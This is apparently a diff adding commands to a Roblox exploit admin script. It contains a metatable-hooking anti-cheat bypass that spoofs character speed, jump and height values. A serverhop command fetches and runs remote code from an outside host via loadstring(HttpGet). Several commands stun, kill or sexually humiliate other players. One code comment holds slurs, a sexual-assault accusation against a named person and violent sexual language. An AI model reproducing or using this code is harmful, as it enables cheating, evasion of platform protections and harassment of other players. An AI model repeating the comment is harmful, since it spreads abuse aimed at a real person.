+			spin.Name = "Spinning"
+			spin.Parent = Utils.GetRoot(v.Character)
+			spin.MaxTorque = Vector3.new(0, math.huge, 0);
+			spin.AngularVelocity = Vector3.new(0,Speed,0);
+		end
+	end
+end)
+
+AddCommand("unspin", {"unclaimspin"}, "unspin {target}\nunspins a player", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (Utils.GetRoot(v.Character):FindFirstChild("Spinning")) then
+			Utils.GetRoot(v.Character).Spinning:Destroy();
+		end
+	end
+end)
+
+AddCommand("whisper", {}, "whisper {target} {text}\nwhispers something to another user", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	local ChatRemote = ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+	for i, v in next, Target do
+		ChatRemote:FireServer(("/w %s %s"):format(v.Name, table.concat(table.pack(table.unpack(Args, 2, #Args)), " ")), "All");
+	end
+end)
+
+AddCommand("serverhop", {"switchserver", "shop"}, "serverhop\nchanges the server you are in", function(Caller, Args)
+	Utils.Notify(Caller or LocalPlayer, nil, "Looking for servers...", 10);
+	local executeonjoin = Args[1] and Args[1]:lower("executeonjoin")
+	local games = {}
+	for i, v in next, HttpService:JSONDecode(game:HttpGetAsync(("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"):format(game.PlaceId))).data do
+		if (type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId) then
+			games[#games + 1] = v.id
+		end
+	end
+	if #games > 0 then
+		pcall(function()
+			syn.queue_on_teleport(([[Key="%s" loadstring(game:HttpGet("https://fate0.xyz/scripts/fates-admin/new-script"))()]]):format(Key or ""));
+			TeleportService:TeleportToPlaceInstance(game.PlaceId, games[math.random(1, #games)]);
+		end)
+	else
+		return Utils.Notify(Caller or LocalPlayer, nil, "No Servers found.");
+	end
+end)
+
+AddCommand("disable", {"stun"}, "disable {target}\ndisables the character",function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").PlatformStand = true
+		end
+	end
+end)
+
+AddCommand("enable", {"unstun", "nostun"}, "enable {target}\nenables the character",function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").PlatformStand = false
+		end
+	end
+end)
+
+AddCommand("fps", {"getfps"}, "fps\ngives you your current fps", function(Caller, Args)
+	
+	local x = 0	
+	local a = tick();
+	local fpsget = function()
+		x = (1 / (tick() - a));
+		a = tick();
+		return ("%.3f"):format(x);
+	end
+	local fps = nil
+	local v = RunService.Stepped:Connect(function()
+		fps = fpsget()
+	end)
+	wait(.2);
+	v:Disconnect();
+	Utils.Notify(Caller or LocalPlayer, "FPS", ("your current fps is %s"):format(fps))
+end)
+
+AddCommand("gravity", {"grav"}, "gravity {number}\nallows you to set gravity", function(Caller, Args)
+	local Amount = Args[1]
+	game.Workspace.Gravity = Args[1] == 'default' and 192 or tonumber(Args[1]);
+end)
+
+AddCommand("ungravity", {"nogravity", "nograv"}, "ungravity\ngravity set back to default", function(Caller, Args)
+	game.Workspace.Gravity = 912
+end)
+
+AddCommand("setspawn", {"spawnpoint"}, "setspawn\nsets a spawn location", function(Caller, Args, Tbl)
+	local pos = Utils.GetRootCFrame(LocalPlayer.Character)
+	if (Tbl[1]) then
+		Tbl[1]:Disconnect();
+	end
+	spawn = LocalPlayer.CharacterAdded:Connect(function()
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = pos
+	end)
+	Tbl[1] = spawn
+end)
+
+AddCommand("removespawnpoint", {"removespawn"}, "removespawn\nremoves spawn point if you have set it", function(Caller, Args)
+	if (CommandStuff["Commands"]["setspawn"][1]) then
+		CommandStuff["Commands"]["setspawn"][1]:Disconnect();
+	else
+		Utils.Notify(Caller or LocalPlayer, nil, "you do not have a spawn point to remove");
+	end
+end)
+
+AddCommand("permclaim", {}, "permclaim\nclaims a user when they reset", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	Utils.Notify(Caller or LocalPlayer, nil, ("started loopclaim on user %s"):format(Target[1].Name));
+	F_A.execmd("claim", Caller, Args)
+	for i, v in next, Target do
+		onDied = function()
+			local time = os.clock();
+			wait(.2)
+			local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+			LocalPlayer.Character:Destroy();
+			LocalPlayer.CharacterAdded:Wait();
+			LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+			repeat wait(); until time + Players.RespawnTime + .5 < os.clock();
+			F_A.execmd("claim", Caller, Args);
+		end
+		v.Character.Humanoid.Died:Connect(function()
+			PermClaim = v.CharacterAdded:Connect(function()
+				PermClaimSecond = v.Character:WaitForChild("Humanoid").Died:Connect(onDied);
+			end)
+			onDied();
+		end);
+		Tbl[v] = {PermClaimSecond,PermClaim}
+	end
+end)
+
+AddCommand("unpermclaim", {"nopermclaim"}, "unpermclaim\nremoves perm claim for the user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, CommandStuff["Commands"]["permclaim"] do
+		for i2, v2 in next, Target do
+			if v2 == i then
+				v:Disconnect();
+			end
+		end
+	end
+end)
+
+AddCommand("deletespawn", {"delspawn", "removespawn"}, "deletespawn\ndeletes your spawn location", function(Caller, Args)
+	getgenv().spawn:Disconnect();
+end)
+
+AddCommand("dmode", {"dildomode"}, "dildomode {target}\nattaches a dick to then", function(Caller, Args)
+	local Target = GetPlayer(Args[1])
+	if (#Target > 1) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "Only 1 player for this command");
+	end	
+	if (not LocalPlayer.Character:FindFirstChild("Pal Hair") or not LocalPlayer.Character:FindFirstChild("Kate Hair") or not LocalPlayer.Character:FindFirstChild("Hat1")) then
+		return Utils.Notify(Caller or LocalPlayer, nil, "you require PalHair, WomanHair and ManHair for this.");
+	end
+	if (LocalPlayer.Character.Head:FindFirstChild("AlignOrientation")) then
+		getgenv().Loop = false
+		local oldpos = Utils.GetRootCFrame(LocalPlayer.Character)
+		LocalPlayer.Character:BreakJoints();
+		LocalPlayer.CharacterAdded:Wait();
+		LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = oldpos
+		wait(.2);
+	end
+	local player=game:GetService("Players").LocalPlayer local character=player.Character local item=character["Right Arm"]item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])local a0=Instance.new("Attachment",item)local a1=Instance.new("Attachment",character["Torso"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=200 a0.Position=Vector3.new(-1.5,1,0.7)a0.Orientation=Vector3.new(-57.42,-180,-180)local player=game:GetService("Players").LocalPlayer local character=player.Character local item=character["Pal Hair"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",character["Right Arm"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=200 a0.Position=Vector3.new(0,1.4,0)a0.Orientation=Vector3.new(0,-90,0)local player=game:GetService("Players").LocalPlayer local character=player.Character local item=character["Kate Hair"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",character["Right Arm"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=200 a0.Position=Vector3.new(0,0,-2.7)a0.Orientation=Vector3.new(90,-180,0)local player=game:GetService("Players").LocalPlayer local character=player.Character local item=character["Hat1"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",character["Head"])local alignPosition=Instance.new("AlignPosition",character["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",character["Right Arm"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=1000 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=1000 a0.Position=Vector3.new(0,0,-4.7)a0.Orientation=Vector3.new(90,-180,0)
+	Target = Target[1]
+	UserInputService.InputBegan:connect(function(inp, GP)
+		if (GP) then
+			return
+		end
+		if (inp.KeyCode == Enum.KeyCode.K) then
+			if (User.Character:FindFirstChildOfClass("Humanoid")) then
+				User.Character:FindFirstChildOfClass("Humanoid").Health = 0
+				wait(3);
+				local olpos = Utils.GetRootCFrame(LocalPlayer.Character)
+				LocalPlayer.Character:Destroy();
+				LocalPlayer.CharacterAdded:Wait();
+				LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = olpos
+			end
+		end
+	end)
+	getgenv().Loop = RunService.Heartbeat:Connect(function()
+		Utils.GetRoot(Target.Character).CFrame = Utils.GetRootCFrame(LocalPlayer.Character) * CFrame.new(1.5, 5, -5)
+		wait();
+		if (not Target or not CheckClaim(Target)) then Loop:Disconnect(); end
+	end)
+end)
+
+AddCommand("crucify", {}, "crucify {target}\ncrucifies someone", function(Caller, Args)
+	local Requirements = {"Pal Hair", "Kate Hair", "Hat1", "Hair", "LavanderHair"}
+	for i, v in next, Requirements do
+		if (not LocalPlayer.Character:FindFirstChild(v)) then
+			return Utils.Notify(Caller or LocalPlayer, nil, "you are not wearing all the hats needed");
+		end
+	end
+	local Target = GetPlayer(Args[1])[1]
+	if (CheckClaim(Target)) then
+		local TargetCharacter = Target.Character
+		Utils.GetRoot(TargetCharacter).Anchored = true
+		local player=LocalPlayer local TargetCharacter=Target.Character local character=player.Character local item=character["LavanderHair"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",TargetCharacter["Head"])local alignPosition=Instance.new("AlignPosition",TargetCharacter["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",TargetCharacter["Torso"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=200 a0.Position=Vector3.new(1,-2.3,.3)a0.Orientation=Vector3.new(0,-90,0)local player=game:GetService("Players").LocalPlayer local TargetCharacter=Target.Character local character=player.Character local item=character["Pal Hair"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",TargetCharacter["Head"])local alignPosition=Instance.new("AlignPosition",TargetCharacter["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",TargetCharacter["Torso"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=200 a0.Position=Vector3.new(1,-2.3,-.3)a0.Orientation=Vector3.new(0,-90,0)local character=player.Character local item=character["Kate Hair"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",TargetCharacter["Head"])local alignPosition=Instance.new("AlignPosition",TargetCharacter["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",TargetCharacter["Torso"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=200 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=200 a0.Position=Vector3.new(0,1,2.5)a0.Orientation=Vector3.new(90,-180,0)local character=player.Character local item=character["Hat1"].Handle item["Mesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",TargetCharacter["Head"])local alignPosition=Instance.new("AlignPosition",TargetCharacter["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",TargetCharacter["Torso"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=1000 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=1000 a0.Position=Vector3.new(0,1,0.5)a0.Orientation=Vector3.new(90,-180,0)local character=player.Character local item=character["Hair"].Handle item["SpecialMesh"]:Destroy()item:BreakJoints()local alignOr=Instance.new("AlignOrientation",TargetCharacter["Head"])local alignPosition=Instance.new("AlignPosition",TargetCharacter["Head"])a0=Instance.new("Attachment",item)a1=Instance.new("Attachment",TargetCharacter["Torso"])alignPosition.Attachment0=a0 alignPosition.Attachment1=a1 alignPosition.Responsiveness=1000 alignOr.Attachment0=a0 alignOr.Attachment1=a1 alignOr.Responsiveness=1000 a0.Position=Vector3.new(0,1,-.9)a0.Orientation=Vector3.new(90,-180,0)	
+	end
+end)
+
+AddCommand("walkto", {}, "walkto {target}\nwalks to the player you choose", function(Caller, Args)
+	local Target = GetPlayer(Args[1])
+	for i, v in next, Target do
+		LocalPlayer.Character.Humanoid:MoveTo(Utils.GetRootCFrame(v.Character).p);
+	end
+end)
+
+AddCommand("follow", {}, "follow\nfollows a user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	local Target2 = GetPlayer(Args[2])[1];
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			getgenv().follow = true
+			coroutine.wrap(function()
+				repeat
+					v.Character.Humanoid:MoveTo(Utils.GetRootCFrame(Target2.Character).p);
+				wait(.1);
+				until not getgenv().follow or not LocalPlayer.Character 
+			end)();
+			-- Tbl[v] = true
+		end
+	end
+end)
+
+AddCommand("unfollow", {}, "unfollow\nunfollows a character", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	-- local Looped = CommandStuff["Commands"]["follow"]
+	-- for i, v in next, Target do
+	-- 	for i2, v2 in next, Looped do
+	-- 		if i2 == v then
+	-- 			v2 = false
+	-- 		end
+	-- 	end
+	-- end
+	getgenv().follow = getgenv().follow and false
+end)
+
+AddCommand("commands", {"cmds"}, "commands\nshows you all the current commands", function(Caller, Args)
+	Commands.Visible = true
+	Utils.TweenAllTransToObject(Commands, .25, CommandsTransparencyClone)
+end)
+
+AddCommand("ping", {}, "ping\nshows you your ping", function(Caller, Args)
+	local Ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1].." ms"
+	Utils.Notify(Caller or LocalPlayer, "Ping", ("your ping is %s"):format(Ping));
+end)
+
+AddCommand("stats", {}, "stats\nshows you game stats", function(Caller, Args, Tbl)
+
+	for i, v in next, StatsBar:GetChildren() do
+		if v:IsA("Frame") then
+			pcall(function()
+				v:Destroy();
+				Tbl[v]:Disconnect();
+			end)
+		end
+	end
+
+	local function TweenDestroy(Instance)
+		local Tween = Utils.TweenAllTrans(Instance, .25)
+
+		Tween.Completed:Wait()
+		Instance:Destroy() -- tween out then destroy
+	end
+
+	local function AddStat(Title, Message, cb)
+		local Stat = Stats:Clone()
+		Stat.Name = Title
+		Stat.Title.Text = Title
+		Stat.Message.Text = Message
+		Utils.SetAllTrans(Stat)
+		Utils.Click(Stat.Close, "TextColor3")
+		Stat.Visible = true 
+		Stat.Parent = StatsBar	
+		Utils.Draggable(Stat)
+		Loop = RunService.Stepped:Connect(function()
+			Stat.Message.Text = cb()
+		end)
+
+		Tbl[Stat] = Loop
+
+		Utils.TweenAllTransToObject(Stat, .5, Stats)
+		
+		Stat.Close.MouseButton1Click:Connect(function()
+			TweenDestroy(Stat)
+		end)
+
+	end
+	
+	Ping, PingCb = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1].." ms", function()
+		return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1].." ms"
+	end
+	local x = 0	
+	local a = tick();
+	Fps = function()
+		x = (1 / (tick() - a));
+		a = tick();
+		return ("%.3f Fps"):format(x);
+	end
+	AddStat("Ping", Ping, PingCb);
+	AddStat("Fps", Fps(), Fps);
+
+	StatsBar.UiListLayout:Destroy();
+end)
+
+AddCommand("skydive", {"freefall"}, "skydive\nskydives the player", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		CheckClaim(v);
+		Utils.GetRoot(v.Character).CFrame = Utils.GetRootCFrame(v.Character) + Vector3.new(0, 300, 0);
+	end
+end)
+
+AddCommand("invisible", {"invis"}, "invisible\nmakes your character invisible", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			local oldpos = Utils.GetRootCFrame(v.Character)
+			Utils.GetRoot(v.Character).CFrame = CFrame.new(9e9, 9e9, 9e9);
+			local clone = Utils.GetRoot(v.Character):Clone();
+			wait(.2);
+			Utils.GetRoot(v.Character):Destroy();
+			clone.CFrame = oldpos
+			clone.Parent = v.Character
+		end
+	end
+end)
+
+AddCommand("drophats", {"drhats"}, "drophats\nallows you to drop hats", function(Caller, Args)
+	for i, v in next, LocalPlayer.Character.Humanoid:GetAccessories() do
+		v.Parent = game:GetService("Workspace");
+	end
+end)
+
+AddCommand("deletehats", {"delhats", "dhats", "nohats"}, "deletehats\ndeletes the hats you're wearing", function(Caller, Args)
+	for i, v in next, LocalPlayer.Character.Humanoid:GetAccessories() do
+		v:Destroy();
+	end
+end)
+
+AddCommand("droptools", {"drtools"}, "droptools\ndrops all of your tools", function(Caller, Args)
+	for i, v in next, LocalPlayer.Backpack:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.CanBeDropped = true
+			v.Parent = LocalPlayer.Character
+			v.Parent = Workspace
+		end
+	end
+	for i, v in next, LocalPlayer.Character:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.CanBeDropped = true
+			v.Parent = game:GetService("Workspace")
+		end
+	end
+end)
+
+AddCommand("deletetools", {"dtools", "notools"}, "deletetools\ndeletes all the tools you have", function(Caller, Args)
+	for i, v in next, LocalPlayer.Backpack:GetChildren() do
+		if (v:IsA("Tool")) then
+			v:Destroy();
+		end
+	end
+	for i, v in next, LocalPlayer.Character:GetChildren() do
+		if (v:IsA("Tool")) then
+			v:Destroy();
+		end
+	end
+end)
+
+AddCommand("equiptools", {}, "equiptools\nequips all of your tools", function(Caller, Args)
+	for i, v in next, LocalPlayer.Backpack:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.Parent = LocalPlayer.Character
+		end
+	end
+	for i, v in next, LocalPlayer.Character:GetChildren() do
+		if (v:IsA("Tool")) then
+			v.Parent = LocalPlayer.Character
+		end
+	end
+end)
+
+AddCommand("tweengoto", {"tweento"}, "tweengoto\ntweens yourself to the other user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		TweenService:Create(Utils.GetRoot(LocalPlayer.Character), TweenInfo.new(2), {CFrame = Utils.GetRootCFrame(v.Character)}):Play();
+		wait();
+	end
+end)
+
+AddCommand("tweenbring", {}, "tweenbring\ntweenbrings the character to you", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			TweenService:Create(Utils.GetRoot(v.Character), TweenInfo.new(2), {CFrame = Utils.GetRootCFrame(LocalPlayer.Character)}):Play();
+		end
+		wait();
+	end
+end)
+
+AddCommand("blockhats", {"bhats"}, "blockhats\nremoves the mesh in your hats", function(Caller, Args)
+	for i, v in next, LocalPlayer.Character.Humanoid:GetAccessories() do
+		v:FindFirstChildWhichIsA("SpecialMesh", true):Destroy();
+	end
+end)
+
+AddCommand("blockhead", {"bhead"}, "blockhead\nremoves the mesh of your characters head", function(Caller, Args)
+	LocalPlayer.Character.Head:FindFirstChildOfClass("SpecialMesh", true):Destroy();
+end)
+
+AddCommand("attach", {}, "attach\nattaches youreself to the user", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		attach2(v);
+	end
+end)
+
+AddCommand("commandcount", {"cc"}, "commandcount\ntells you how many commands there are", function(Caller, Args)
+	Utils.Notify(Caller or LocalPlayer, "Amount of Commands", string.format("There are currently %s commands.", #Functions));
+end)
+
+AddCommand("noface", {"nface", "unface"}, "noface\nremoves the face of your character", function(Caller, Args)
+	LocalPlayer.Character.Head:FindFirstChildOfClass("Decal", true):Destroy();
+end)
+
+AddCommand("checknet", {"cnet"}, "checknet\nshows you the people who are using network ownership", function(Caller, Args)
+	local NetworkUsers = {}
+	for _, v in next, Players:GetPlayers() do
+		if (GetNetwork(v) >= 10000) then
+			NetworkUsers[#NetworkUsers + 1] = v.Name
+		end
+	end
+	Utils.Notify(Caller or LocalPlayer, "Network Users", table.concat(NetworkUsers, ", "));
+end)
+
+AddCommand("naked", {"noclothes"}, "naked\nmakes you naked", function(Caller, Args)
+	LocalPlayer.Character:FindFirstChildWhichIsA("Pants", true):Destroy();
+	LocalPlayer.Character:FindFirstChildWhichIsA("Shirt", true):Destroy();
+end)
+
+-- universal undetectable property spoof by Iaying#6564
+local bypassws, bypassjp, bypasshh = false, false, false
+pcall(function()
+	local char = LocalPlayer.Character
+	local hum
+	local function onChar(nchar)
+		if nchar then
+			char = nchar
+			hum = char:WaitForChild('Humanoid')
+		end
+	end
+	if char then
+		onChar(char)
+	end
+	LocalPlayer.CharacterAdded:Connect(onChar)
+
+	local meta = getrawmetatable(game)
+	local index = meta.__index
+	local newindex = meta.__newindex
+	if make_writeable then
+		make_writeable(meta)
+	elseif setreadonly then
+		setreadonly(meta, false)
+	end
+
+	local function sanitizeString(str) -- I fucking hate hazzel so fucking much. I was having such a good day, then this fucking MONKEY RETARD wobbles his way into my fucking domain jacking off onto my fucking script. THIS MAN REALLY USED THE "HURUAHA I HAVE A '\0' AT THE END OF THE PROPERTY NAME" AS A FUCKING METHOD OF DETECTING MY BYPASS. I was SO FUCKING CONFIDENT in myself until this fucking monkey retard came in with his dumb ass "Vanguard V4" and FUCKING DETECTED MY BYPASS. I am literally shaking and crying right now. I am filing a lawsuit against hazzel on the 7th of April for sexual assault and I hope he burns in hell. tldr; rape his dog
+		return ({str:gsub('\0.*','')})[1]
+	end
+
+	local nws = hum and hum.WalkSpeed or 16
+	local njp = hum and hum.JumpPower or 50
+	local nhh = hum and hum.HipHeight or 2
+	meta.__index = newcclosure(function(self, k)
+		if self == hum and not checkcaller() and typeof(k) == 'string' then
+			local nk = sanitizeString(k)
+			if nk == 'WalkSpeed' and bypassws then
+				return nws
+			elseif nk == 'JumpPower' and bypassjp then
+				return njp
+			elseif nk == 'HipHeight' and bypasshh then
+				return nhh
+			end
+		end
+		return index(self, k)
+	end)
+
+	local function onSignal(tbl, signal, identifier)
+		return signal:Connect(function(...)
+			table.insert(tbl, {identifier, {...}})
+		end)
+	end
+
+	local function fireSignal(signal, args)
+		for _,v in pairs(getconnections(signal)) do
+			v:Fire(unpack(args))
+		end
+	end
+	local function disableSignals(signal)
+		for _,v in pairs(getconnections(signal)) do
+			v:Disable()
+		end
+	end
+	local function enableSignals(signal)
+		for _,v in pairs(getconnections(signal)) do
+			v:Enable()
+		end
+	end
+
+	meta.__newindex = newcclosure(function(self, k, v)
+		if self == hum and typeof(k) == 'string' then
+			local nk = sanitizeString(k)
+			if (nk == 'WalkSpeed' and bypassws) or (nk == 'JumpPower' and bypassjp) or (nk == 'HipHeight' and bypasshh) then
+				if not checkcaller() then
+					local fhum = Instance.new('Humanoid')
+					fhum.WalkSpeed = nk == 'WalkSpeed' and nws or (nk == 'JumpPower' and njp or (nk == 'HipHeight' and nhh))
+					local data = {}
+					local c1, c2 = fhum.Changed, fhum:GetPropertyChangedSignal(k)
+					local t1, t2 = onSignal(data, c1, hum.Changed), onSignal(data, c2, hum:GetPropertyChangedSignal(k))
+					local suc, ret = pcall(function()
+						return {
+							newindex(fhum, k, v)
+						}
+					end)
+					t1:Disconnect()
+					t2:Disconnect()
+					if nk == 'WalkSpeed' then
+						nws = index(fhum, k)
+					elseif nk == 'JumpPower' then
+						njp = index(fhum, k)
+					elseif nk == 'HipHeight' then
+						nhh = index(fhum, k)
+					end
+					table.foreach(data, function(_,tbl)
+						local iden = tbl[1]
+						local args = tbl[2]
+
+						fireSignal(iden, args)
+					end)
+					fhum:Destroy()
+					if not suc then
+						return error(ret, 0)
+					end
+					return unpack(ret)
+				else
+					if hum then
+						disableSignals(hum.Changed)
+						disableSignals(hum:GetPropertyChangedSignal(k))
+						local suc, ret = pcall(function()
+							return {
+								newindex(self, k, v)
+							}
+						end)
+						enableSignals(hum.Changed)
+						enableSignals(hum:GetPropertyChangedSignal(k))
+						if not suc then
+							return error(ret, 0)
+						end
+						return unpack(ret)
+					end
+				end
+			end
+		end
+		return newindex(self, k, v)
+	end)
+
+	if make_readonly then
+		make_readonly(meta)
+	elseif setreadonly then
+		setreadonly(meta, true)
+	end
+end)
+
+AddCommand("bws", {"bypassws", "bypasswalkspeed"}, "bjp\nbypasses walkspeed", function(Caller, Args)
+	if Caller == LocalPlayer then
+		bypassws = true
+		return Utils.Notify(Caller or LocalPlayer, nil, "Bypassed WalkSpeed")
+	end
+end)
+
+AddCommand("unbws", {"unbypassws", "unbypasswalkspeed"}, "unbjp\nunbypasses walkspeed", function(Caller, Args)
+	if Caller == LocalPlayer then
+		bypassws = false
+		return Utils.Notify(Caller or LocalPlayer, nil, "Removed bypass on WalkSpeed")
+	end
+end)
+
+AddCommand("bjp", {"bypassjp", "bypassjumppower"}, "bjp\nbypasses jumppower", function(Caller, Args)
+	if Caller == LocalPlayer then
+		bypassjp = true
+		return Utils.Notify(Caller or LocalPlayer, nil, "Bypassed JumpPower")
+	end
+end)
+
+AddCommand("unbjp", {"unbypassjp", "unbypassjumppower"}, "unbjp\nunbypasses jumppower", function(Caller, Args)
+	if Caller == LocalPlayer then
+		bypassjp = false
+		return Utils.Notify(Caller or LocalPlayer, nil, "Removed bypass on JumpPower")
+	end
+end)
+
+AddCommand("bhh", {"bypasshh", "bypasshipheight"}, "bjp\nbypasses hipheight", function(Caller, Args)
+	if Caller == LocalPlayer then
+		bypasshh = true
+		return Utils.Notify(Caller or LocalPlayer, nil, "Bypassed HipHeight")
+	end
+end)
+
+AddCommand("unbhh", {"unbypasshh", "unbypasshipheight"}, "unbjp\nunbypasses hipheight", function(Caller, Args)
+	if Caller == LocalPlayer then
+		bypasshh = false
+		return Utils.Notify(Caller or LocalPlayer, nil, "Removed bypass on HipHeight")
+	end
+end)
+
+AddCommand("ws", {"walkspeed", "speed", "speedboost"}, "ws {number}/default\nchanges walkspeed", function(Caller, Args)
+	local IsNumber1 = tonumber(Args[1])
+
+	local Target = IsNumber1 and {LocalPlayer} or GetPlayer(Args[1])
+	local Amount = tonumber(Args[2] or ".")
+
+	-- Args[1]
+	if (Args[1] == "default") then
+		Target = {LocalPlayer}
+		Amount = 16
+	end
+
+	-- Args[2]
+	if (Args[2] == "default") then
+		Amount = 16
+	end
+
+	Amount = Amount or (IsNumber1 or 50)
+
+	for _, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = Amount
+		end
+	end
+end)
+
+AddCommand("jp", {"jumppower", "jumpboost"}, "jp {number}/default\nchanges jumpower", function(Caller, Args)
+	local IsNumber1 = tonumber(Args[1])
+
+	local Target = IsNumber1 and {LocalPlayer} or GetPlayer(Args[1])
+	local Amount = tonumber(Args[2] or ".")
+
+	-- Args[1]
+	if (Args[1] == "default") then
+		Target = {LocalPlayer}
+		Amount = 50
+	end
+
+	-- Args[2]
+	if (Args[2] == "default") then
+		Amount = 50
+	end
+
+	Amount = Amount or (IsNumber1 or 70)
+
+	for _, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").JumpPower = Amount
+		end
+	end
+end)
+
+AddCommand("hh", {"hipheight"}, "hh\n {number}/defaultchanges hipheight", function(Caller, Args)
+	local Target, Amount = GetPlayer(Args[1]), Args[2] or 10
+	if (type(Args[2]) == 'string' and Args[2] == "default") then
+		Amount = 0
+	end
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").HipHeight = Amount
+		end		
+	end
+end)
+
+AddCommand("jump", {}, "jump\njumps the character", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").Jump = true
+		end
+	end
+end)
+
+AddCommand("sit", {}, "sit\nsits the character", function(Caller, Args)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		if (CheckClaim(v)) then
+			v.Character:FindFirstChildOfClass("Humanoid").Sit = true
+		end
+	end
+end)
+
+AddCommand("headsit", {"hsit"}, "headsit {target}\nsits on the players head", function(Caller, Args, Tbl)
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Target do
+		LocalPlayer.Character.Humanoid.Sit = true
+		Sit = LocalPlayer.Character.Humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+			LocalPlayer.Character.Humanoid.Sit = true
+		end)
+		coroutine.wrap(function()
+			Loop = RunService.Heartbeat:Connect(function()
+				Utils.GetRoot(LocalPlayer.Character).CFrame = v.Character.Head.CFrame * CFrame.new(0, 0, 1);
+			end)
+		end)()
+		Tbl[v] = Loop
+		Tbl[#Tbl + 1] = Sit
+	end
+end)
+
+AddCommand("unheadsit", {"noheadsit"}, "unheadsit {target}\nunheadsits on the target", function(Caller, Args)
+	local Looped = CommandStuff["Commands"]["headsit"]
+	local Target = GetPlayer(Args[1]);
+	for i, v in next, Looped do
+		v:Disconnect();
+	end
+end)
+
+AddCommand("headstand", {"hstand"}, "headstand {target}\nstans on a players head", function(Caller, Args, Tbl)
